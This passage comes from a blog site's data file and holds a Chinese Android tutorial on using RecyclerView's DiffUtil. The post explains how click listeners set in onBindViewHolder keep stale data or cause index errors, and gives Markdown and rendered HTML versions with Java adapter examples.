mOnItemClickListener;\n\n    public interface OnItemClickListener {\n        void onItemClick(View view, RecyclerView.ViewHolder holder, int position);\n\n        void onItemLongClick(View view, RecyclerView.ViewHolder holder, int position);\n    }\n\n    public BaseXXXAdapter(Context context) {\n        // ...\n        mOnClickListener = v -> {\n            RecyclerView.ViewHolder h = (RecyclerView.ViewHolder) v.getTag();\n            int pos = h.getAdapterPosition();\n            if (mOnItemClickListener != null) {\n                mOnItemClickListener.onItemClick(v, h, pos);\n            }\n        };\n        mOnLongClickListener = v -> {\n            RecyclerView.ViewHolder h = (RecyclerView.ViewHolder) v.getTag();\n            int pos = h.getAdapterPosition();\n            if (mOnItemClickListener != null) {\n                mOnItemClickListener.onItemLongClick(v, h, pos);\n            }\n            return true;\n        };\n    }\n\n    public void setOnItemClickListener(OnItemClickListener clickListener) {\n        this.mOnItemClickListener = clickListener;\n    }\n\n    @Override\n    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        // ...省略holder实例化\n        holder.itemView.setTag(holder); // 把holder当tag存\n        holder.itemView.setOnClickListener(mOnClickListener);\n        holder.itemView.setOnLongClickListener(mOnLongClickListener);\n        return holder;\n    }\n}\n\n// 继承实现的实际业务Adapter\npublic class XXXAdapter extends BaseXXXAdapter<User> {\n    public XXXAdapter(Context context) {\n        setOnItemClickListener(new OnItemClickListener() {\n            @Override\n            public void onItemClick(View view, RecyclerView.ViewHolder holder, int position) {\n                MyItemViewHolder h = (MyItemViewHolder) holder;\n                // 每次点击都保证了为对应位置的数据，再也不用担心数据错位问题了\n                User user = getData().get(position);\n            }\n\n            @Override\n            public void onItemLongClick(View view, RecyclerView.ViewHolder holder, int position) {\n                // ...\n            }\n        });\n    }\n}\n```\n","source":"_posts/2020-01-12-RecyclerView中DiffUtil的一些注意事项.md","raw":"---\nlayout:     post\ntitle:      RecyclerView中DiffUtil的一些注意事项\nsubtitle:   见微知著。\ndate:       2020-01-12\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n### 节能刷新\n\n移动设备屏幕大小有限（不得不说我是顽固的小屏爱好者，大于5.5寸难以接受，时代已经抛弃我了哈哈），列表（List）可以说是一个出现非常高频的交互设计。大多数情况下我们的列表不仅仅是一次性加载本地数据，而要应付来自网络的各种动态内容，可能是增加、删除等操作。\n\n在Android开发中，一个耳熟能详的方法就是 `notifyDataSetChanged` ，在适配器（Adapter）的设计模式下，每当我们的列表数据发生变更时，就需要调用此方法来更新UI。然而，这个方法并不“**节能**”，它会同时刷新列表中的所有item，包括那些并没有变化的数据，这样就带来很多计算资源的浪费。要知道，从你的一个 `setText` 或者 `setImageResource` 方法调用到最终呈现到屏幕上，软件到硬件，中间经历了非常复杂的过程。基于能省则省的移动开发原则，有没有更好的办法呢？\n\n### DiffUtil用起来\n\n谷歌确实也考虑到了这个问题，所以不知道在什么时候（暂时没有去查阅）推出了DiffUtil这个解决方案。在RecyclerView的依赖包下面，可以看到，除了DiffUtil，还有异步处理数据等一系列有趣的工具。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200113015406917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\nDiffUtil的运用逻辑非常简单，大致如下：\n\n- 实现对比新旧数据的方法（类似比较器），这样DiffUtil便知道当新数据来临时，该不该更新某个item。\n- 更新数据时，把新旧数据丢给DiffUtil，底层会根据你实现的对比方法，利用一种差分算法自动计算出差异，最后局部更新到UI。\n\n这样做的好处就是避免了不必要的UI更新，DiffUtil计算出差异之后，只刷新产生变动的item。具体地，我们可以在Adapter的 `onBindViewHolder` 方法打断点或者日志观察，或者调用 `registerAdapterDataObserver` 方法监听item的各种操作情况。其次，以前的 `notifyDataSetChanged` 方法由于会刷新整个列表所以没有原生的动画效果，而DiffUtil内部最终调用了各种 `notifyItemXXX` 方法。\n\nDiffUtil的使用也很简单：\n\n1、先实现比较新旧数据的回调，可以是一个独立的类，也可以写成Adapter的内部类：\n\n```java\npublic class BaseXXXAdapter<T> extends RecyclerView.Adapter {\n    // ...\n\n    private class DiffCallback extends DiffUtil.Callback {\n        private List<T> oldData, newData;\n\n        DiffCallback(List<T> oldData, List<T> newData) {\n            this.oldData = oldData;\n            this.newData = newData;\n        }\n\n        @Override\n        public int getOldListSize() {\n            return oldData.size();\n        }\n\n        @Override\n        public int getNewListSize() {\n            return newData.size();\n        }\n\n        @Override\n        public boolean areItemsTheSame(int oldItemPosition, int newItemPosition) {\n            T oldT = oldData.get(oldItemPosition);\n            T newT = newData.get(newItemPosition);\n            // 实际情况最好是在此处对比新旧数据的id（比如用户uid），这里为了方便示例直接equals对象了\n            // 若此处返回true，则DiffUtil会再调用下面的areContentsTheSame方法，进一步对比UI是否有变化\n            // 若此处返回false，则说明id都不同，肯定不是一个item\n            return Objects.equals(oldT, newT);\n        }\n\n        @Override\n        public boolean areContentsTheSame(int oldItemPosition, int newItemPosition) {\n            // TODO 比较新旧数据（主要是UI展示内容）是否相同，这里为了方便示例直接返回true\n            return true;\n        }\n    }\n}\n```\n\n2、然后在Adapter内部实现一个update数据的方法：\n\n```java\n    @Override\n    public void updateData(List<T> newData) {\n        DiffUtil.DiffResult result = DiffUtil.calculateDiff(new DiffCallback(getData(), newData));\n        // 这里的getData即表示获取整个列表的数据，自行实现即可\n        getData().clear();\n        getData().addAll(newData);\n        result.dispatchUpdatesTo(this);\n    }\n```\n\n注意这里的 `dispatchUpdatesTo` 可以在clear之前，也可以在addAll之后，实际效果暂未发现什么区别，之前查阅资料包括官方示例也都是最后执行dispatch，姑且认为这样算标准吧。\n\n3、……咦，怎么才两步，确实就这么简单。重点还是 `areItemsTheSame` 和 `areContentsTheSame` 方法，后者大部分时候只需要对比每个item上UI展示出来的数据即可，因为用户只关心眼见的内容。\n\n### 解决使用后产生的问题\n\n我们会发现在上面的使用示例中，`updateData` 方法内部对原数据进行了清除和添加的操作，这会导致一个问题便是：**列表数据集合中的对象已经变了，即使其某项对应的UI内容没有发生变化**。\n\n举个例子，一个通讯录列表里面有 **[小明, 小红]** 两个人，对应内存地址为 **[a1, a2]**，现在通过上述 `updateData` 方法更新了通讯录列表，UI内容变成了 **[小王, 小红]**，对应内存地址为 **[b1, b2]**。对用户来说小红这个item看上去没有发生变化，但其实对应的数据类对象已经不同。**而且此时 `onBindViewHolder` 方法只会触发一次，将小明更新成小王，而不会触发小红那个position对应的 `onBindViewHolder`** 。\n\n上述细节很关键，如果开发过程中绑定（bind）数据**不恰当**的话，就容易造成各种奇异问题，比如网上资料最多的DiffUtil导致item点击事件数据错位问题、数组越界崩溃问题等等。\n\n这里的“不恰当”，绝大部分情况下，总结出来：其实指的就是在 `onBindViewHolder` 方法中持有了某个位置（position）对应数据的不可变对象。最常见的误用示例就是在 `onBindViewHolder` 中设置某些控件的点击事件并引用数据对象：\n\n```java\n    // 此处假设item的数据类为User\n    @Override\n    public void onBindViewHolder(RecyclerView.ViewHolder holder, int position) {\n        MyItemViewHolder h = (MyItemViewHolder) holder;\n        User user = getData().get(position);\n        h.mNameTextView.setOnClickListener(v -> {\n            // 第2种写法：User user = getData().get(position);\n            // 假设这里是点击item跳转到该User对应的个人主页界面\n            startWebView(user.getHomePageUrl());\n        });\n    }\n```\n\n在不接入DiffUtil之前，上面这段代码没有任何问题，因为我们都是使用 `notifyDataSetChanged` 方法来更新UI，每次更新调用到 `onBindViewHolder` 时，点击事件都会重新设置，get出来的user对象自然也是最新的。一旦我们使用了DiffUtil，就会出问题了。\n\n回到上面小王绿了小明的例子，在我们的 `updateData` 方法执行后，如果我们只对比了user的名字这个属性（其实也只需要对比这个属性），那么小红那一个item就不会触发对应的 `onBindViewHolder` ，即小红的点击事件回调里，**仍然持有着旧数据集的user对象（对应那个内存地址a2）**。但实际上小红应该对应 **b2** 那个内存了，这就造成 **a2** 内存无法释放，问题是不是显得有点严重了。\n\n有同学说无所谓呀，反正点击事件依然有效。那如果我说网络数据刷新下来小红的 **homePageUrl** 变了呢？是不是还得把这个属性加入DiffUtil的对比方法中？这样最终会导致小红的 `onBindViewHolder` 方法也执行，跟 `notifyDataSetChanged` 岂不是没什么两样了？\n\n此外，若get对象写成注释中的第2种写法，且列表第0个位置的item被删了呢？小红顶上去变成了第0个，此时由于小红的UI内容没变，只是位置变了，所以 `onBindViewHolder` 依然不会执行。以上面的示例代码来看，当再次点击小红时，就会直接出现数组越界的异常。因为position还是之前的1，而此时小红的position已经为0。\n\n显然上述出现的这些问题不符合谷歌的设计初衷，也不符合我们使用DiffUtil的初衷。其实**解决办法**很简单，就是要对 `onBindViewHolder` 方法有一个正确的认知，其原则就是：\n\n- `onBindViewHolder` 只做UI内容的更新，如 `setText`，`setImageXXX` 等方法。做到数据对象一次性使用。\n- 不要跨作用域持有与位置（position）相关的数据，比如每个item的数据对象。尤其就是避免在 `onBindViewHolder` 中设置点击事件监听。\n\n正确的点击事件监听还是参照如下形式比较好：\n\n```java\n// 比如这是某个Base适配器类\npublic class BaseXXXAdapter<T> extends RecyclerView.Adapter {\n    // ...\n    private View.OnClickListener mOnClickListener;\n    private View.OnLongClickListener mOnLongClickListener;\n    private OnItemClickListener mOnItemClickListener;\n\n    public interface OnItemClickListener {\n        void onItemClick(View view, RecyclerView.ViewHolder holder, int position);\n\n        void onItemLongClick(View view, RecyclerView.ViewHolder holder, int position);\n    }\n\n    public BaseXXXAdapter(Context context) {\n        // ...\n        mOnClickListener = v -> {\n            RecyclerView.ViewHolder h = (RecyclerView.ViewHolder) v.getTag();\n            int pos = h.getAdapterPosition();\n            if (mOnItemClickListener != null) {\n                mOnItemClickListener.onItemClick(v, h, pos);\n            }\n        };\n        mOnLongClickListener = v -> {\n            RecyclerView.ViewHolder h = (RecyclerView.ViewHolder) v.getTag();\n            int pos = h.getAdapterPosition();\n            if (mOnItemClickListener != null) {\n                mOnItemClickListener.onItemLongClick(v, h, pos);\n            }\n            return true;\n        };\n    }\n\n    public void setOnItemClickListener(OnItemClickListener clickListener) {\n        this.mOnItemClickListener = clickListener;\n    }\n\n    @Override\n    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        // ...省略holder实例化\n        holder.itemView.setTag(holder); // 把holder当tag存\n        holder.itemView.setOnClickListener(mOnClickListener);\n        holder.itemView.setOnLongClickListener(mOnLongClickListener);\n        return holder;\n    }\n}\n\n// 继承实现的实际业务Adapter\npublic class XXXAdapter extends BaseXXXAdapter<User> {\n    public XXXAdapter(Context context) {\n        setOnItemClickListener(new OnItemClickListener() {\n            @Override\n            public void onItemClick(View view, RecyclerView.ViewHolder holder, int position) {\n                MyItemViewHolder h = (MyItemViewHolder) holder;\n                // 每次点击都保证了为对应位置的数据，再也不用担心数据错位问题了\n                User user = getData().get(position);\n            }\n\n            @Override\n            public void onItemLongClick(View view, RecyclerView.ViewHolder holder, int position) {\n                // ...\n            }\n        });\n    }\n}\n```\n","slug":"RecyclerView中DiffUtil的一些注意事项","published":1,"updated":"2024-03-25T07:31:25.859Z","comments":1,"photos":[],"link":"","_id":"cluaufh0v001zthe681857gwu","content":"<h3 id=\"节能刷新\"><a href=\"#节能刷新\" class=\"headerlink\" title=\"节能刷新\"></a>节能刷新</h3><p>移动设备屏幕大小有限（不得不说我是顽固的小屏爱好者，大于5.5寸难以接受，时代已经抛弃我了哈哈），列表（List）可以说是一个出现非常高频的交互设计。大多数情况下我们的列表不仅仅是一次性加载本地数据，而要应付来自网络的各种动态内容，可能是增加、删除等操作。</p>\n<p>在Android开发中，一个耳熟能详的方法就是 <code>notifyDataSetChanged</code> ，在适配器（Adapter）的设计模式下，每当我们的列表数据发生变更时，就需要调用此方法来更新UI。然而，这个方法并不“<strong>节能</strong>”，它会同时刷新列表中的所有item，包括那些并没有变化的数据，这样就带来很多计算资源的浪费。要知道，从你的一个 <code>setText</code> 或者 <code>setImageResource</code> 方法调用到最终呈现到屏幕上，软件到硬件，中间经历了非常复杂的过程。基于能省则省的移动开发原则，有没有更好的办法呢？</p>\n<h3 id=\"DiffUtil用起来\"><a href=\"#DiffUtil用起来\" class=\"headerlink\" title=\"DiffUtil用起来\"></a>DiffUtil用起来</h3><p>谷歌确实也考虑到了这个问题，所以不知道在什么时候（暂时没有去查阅）推出了DiffUtil这个解决方案。在RecyclerView的依赖包下面，可以看到，除了DiffUtil，还有异步处理数据等一系列有趣的工具。<br><img src=\"https://imgconvert.csdnimg.cn/20200113015406917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>DiffUtil的运用逻辑非常简单，大致如下：</p>\n<ul>\n<li>实现对比新旧数据的方法（类似比较器），这样DiffUtil便知道当新数据来临时，该不该更新某个item。</li>\n<li>更新数据时，把新旧数据丢给DiffUtil，底层会根据你实现的对比方法，利用一种差分算法自动计算出差异，最后局部更新到UI。</li>\n</ul>\n<p>这样做的好处就是避免了不必要的UI更新，DiffUtil计算出差异之后，只刷新产生变动的item。具体地，我们可以在Adapter的 <code>onBindViewHolder</code> 方法打断点或者日志观察，或者调用 <code>registerAdapterDataObserver</code> 方法监听item的各种操作情况。其次，以前的 <code>notifyDataSetChanged</code> 方法由于会刷新整个列表所以没有原生的动画效果，而DiffUtil内部最终调用了各种 <code>notifyItemXXX</code> 方法。</p>\n<p>DiffUtil的使用也很简单：</p>\n<p>1、先实现比较新旧数据的回调，可以是一个独立的类，也可以写成Adapter的内部类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;T&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">RecyclerView</span>.Adapter &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DiffCallback</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DiffUtil</span>.Callback &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> List&lt;T&gt; oldData, newData;</span><br><span class=\"line\"></span><br><span class=\"line\">        DiffCallback(List&lt;T&gt; oldData, List&lt;T&gt; newData) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.oldData = oldData;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.newData = newData;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getOldListSize</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> oldData.size();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getNewListSize</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> newData.size();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">areItemsTheSame</span><span class=\"params\">(<span class=\"type\">int</span> oldItemPosition, <span class=\"type\">int</span> newItemPosition)</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">T</span> <span class=\"variable\">oldT</span> <span class=\"operator\">=</span> oldData.get(oldItemPosition);</span><br><span class=\"line\">            <span class=\"type\">T</span> <span class=\"variable\">newT</span> <span class=\"operator\">=</span> newData.get(newItemPosition);</span><br><span class=\"line\">            <span class=\"comment\">// 实际情况最好是在此处对比新旧数据的id（比如用户uid），这里为了方便示例直接equals对象了</span></span><br><span class=\"line\">            <span class=\"comment\">// 若此处返回true，则DiffUtil会再调用下面的areContentsTheSame方法，进一步对比UI是否有变化</span></span><br><span class=\"line\">            <span class=\"comment\">// 若此处返回false，则说明id都不同，肯定不是一个item</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> Objects.equals(oldT, newT);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">areContentsTheSame</span><span class=\"params\">(<span class=\"type\">int</span> oldItemPosition, <span class=\"type\">int</span> newItemPosition)</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// TODO 比较新旧数据（主要是UI展示内容）是否相同，这里为了方便示例直接返回true</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2、然后在Adapter内部实现一个update数据的方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">updateData</span><span class=\"params\">(List&lt;T&gt; newData)</span> &#123;</span><br><span class=\"line\">    DiffUtil.<span class=\"type\">DiffResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> DiffUtil.calculateDiff(<span class=\"keyword\">new</span> <span class=\"title class_\">DiffCallback</span>(getData(), newData));</span><br><span class=\"line\">    <span class=\"comment\">// 这里的getData即表示获取整个列表的数据，自行实现即可</span></span><br><span class=\"line\">    getData().clear();</span><br><span class=\"line\">    getData().addAll(newData);</span><br><span class=\"line\">    result.dispatchUpdatesTo(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意这里的 <code>dispatchUpdatesTo</code> 可以在clear之前，也可以在addAll之后，实际效果暂未发现什么区别，之前查阅资料包括官方示例也都是最后执行dispatch，姑且认为这样算标准吧。</p>\n<p>3、……咦，怎么才两步，确实就这么简单。重点还是 <code>areItemsTheSame</code> 和 <code>areContentsTheSame</code> 方法，后者大部分时候只需要对比每个item上UI展示出来的数据即可，因为用户只关心眼见的内容。</p>\n<h3 id=\"解决使用后产生的问题\"><a href=\"#解决使用后产生的问题\" class=\"headerlink\" title=\"解决使用后产生的问题\"></a>解决使用后产生的问题</h3><p>我们会发现在上面的使用示例中，<code>updateData</code> 方法内部对原数据进行了清除和添加的操作，这会导致一个问题便是：<strong>列表数据集合中的对象已经变了，即使其某项对应的UI内容没有发生变化</strong>。</p>\n<p>举个例子，一个通讯录列表里面有 <strong>[小明, 小红]</strong> 两个人，对应内存地址为 **[a1, a2]**，现在通过上述 <code>updateData</code> 方法更新了通讯录列表，UI内容变成了 **[小王, 小红]**，对应内存地址为 <strong>[b1, b2]<strong>。对用户来说小红这个item看上去没有发生变化，但其实对应的数据类对象已经不同。</strong>而且此时 <code>onBindViewHolder</code> 方法只会触发一次，将小明更新成小王，而不会触发小红那个position对应的 <code>onBindViewHolder</code></strong> 。</p>\n<p>上述细节很关键，如果开发过程中绑定（bind）数据<strong>不恰当</strong>的话，就容易造成各种奇异问题，比如网上资料最多的DiffUtil导致item点击事件数据错位问题、数组越界崩溃问题等等。</p>\n<p>这里的“不恰当”，绝大部分情况下，总结出来：其实指的就是在 <code>onBindViewHolder</code> 方法中持有了某个位置（position）对应数据的不可变对象。最常见的误用示例就是在 <code>onBindViewHolder</code> 中设置某些控件的点击事件并引用数据对象：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 此处假设item的数据类为User</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onBindViewHolder</span><span class=\"params\">(RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">MyItemViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (MyItemViewHolder) holder;</span><br><span class=\"line\">    <span class=\"type\">User</span> <span class=\"variable\">user</span> <span class=\"operator\">=</span> getData().get(position);</span><br><span class=\"line\">    h.mNameTextView.setOnClickListener(v -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第2种写法：User user = getData().get(position);</span></span><br><span class=\"line\">        <span class=\"comment\">// 假设这里是点击item跳转到该User对应的个人主页界面</span></span><br><span class=\"line\">        startWebView(user.getHomePageUrl());</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在不接入DiffUtil之前，上面这段代码没有任何问题，因为我们都是使用 <code>notifyDataSetChanged</code> 方法来更新UI，每次更新调用到 <code>onBindViewHolder</code> 时，点击事件都会重新设置，get出来的user对象自然也是最新的。一旦我们使用了DiffUtil，就会出问题了。</p>\n<p>回到上面小王绿了小明的例子，在我们的 <code>updateData</code> 方法执行后，如果我们只对比了user的名字这个属性（其实也只需要对比这个属性），那么小红那一个item就不会触发对应的 <code>onBindViewHolder</code> ，即小红的点击事件回调里，<strong>仍然持有着旧数据集的user对象（对应那个内存地址a2）</strong>。但实际上小红应该对应 <strong>b2</strong> 那个内存了，这就造成 <strong>a2</strong> 内存无法释放，问题是不是显得有点严重了。</p>\n<p>有同学说无所谓呀，反正点击事件依然有效。那如果我说网络数据刷新下来小红的 <strong>homePageUrl</strong> 变了呢？是不是还得把这个属性加入DiffUtil的对比方法中？这样最终会导致小红的 <code>onBindViewHolder</code> 方法也执行，跟 <code>notifyDataSetChanged</code> 岂不是没什么两样了？</p>\n<p>此外，若get对象写成注释中的第2种写法，且列表第0个位置的item被删了呢？小红顶上去变成了第0个，此时由于小红的UI内容没变，只是位置变了，所以 <code>onBindViewHolder</code> 依然不会执行。以上面的示例代码来看，当再次点击小红时，就会直接出现数组越界的异常。因为position还是之前的1，而此时小红的position已经为0。</p>\n<p>显然上述出现的这些问题不符合谷歌的设计初衷，也不符合我们使用DiffUtil的初衷。其实<strong>解决办法</strong>很简单，就是要对 <code>onBindViewHolder</code> 方法有一个正确的认知，其原则就是：</p>\n<ul>\n<li><code>onBindViewHolder</code> 只做UI内容的更新，如 <code>setText</code>，<code>setImageXXX</code> 等方法。做到数据对象一次性使用。</li>\n<li>不要跨作用域持有与位置（position）相关的数据，比如每个item的数据对象。尤其就是避免在 <code>onBindViewHolder</code> 中设置点击事件监听。</li>\n</ul>\n<p>正确的点击事件监听还是参照如下形式比较好：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如这是某个Base适配器类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;T&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">RecyclerView</span>.Adapter &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> View.OnClickListener mOnClickListener;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View.OnLongClickListener mOnLongClickListener;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> OnItemClickListener mOnItemClickListener;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">OnItemClickListener</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">void</span> <span class=\"title function_\">onItemClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">void</span> <span class=\"title function_\">onItemLongClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BaseXXXAdapter</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        mOnClickListener = v -&gt; &#123;</span><br><span class=\"line\">            RecyclerView.<span class=\"type\">ViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (RecyclerView.ViewHolder) v.getTag();</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">pos</span> <span class=\"operator\">=</span> h.getAdapterPosition();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mOnItemClickListener != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                mOnItemClickListener.onItemClick(v, h, pos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        mOnLongClickListener = v -&gt; &#123;</span><br><span class=\"line\">            RecyclerView.<span class=\"type\">ViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (RecyclerView.ViewHolder) v.getTag();</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">pos</span> <span class=\"operator\">=</span> h.getAdapterPosition();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mOnItemClickListener != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                mOnItemClickListener.onItemLongClick(v, h, pos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setOnItemClickListener</span><span class=\"params\">(OnItemClickListener clickListener)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.mOnItemClickListener = clickListener;</span><br><span class=\"line\">    &#125;</span><br><span 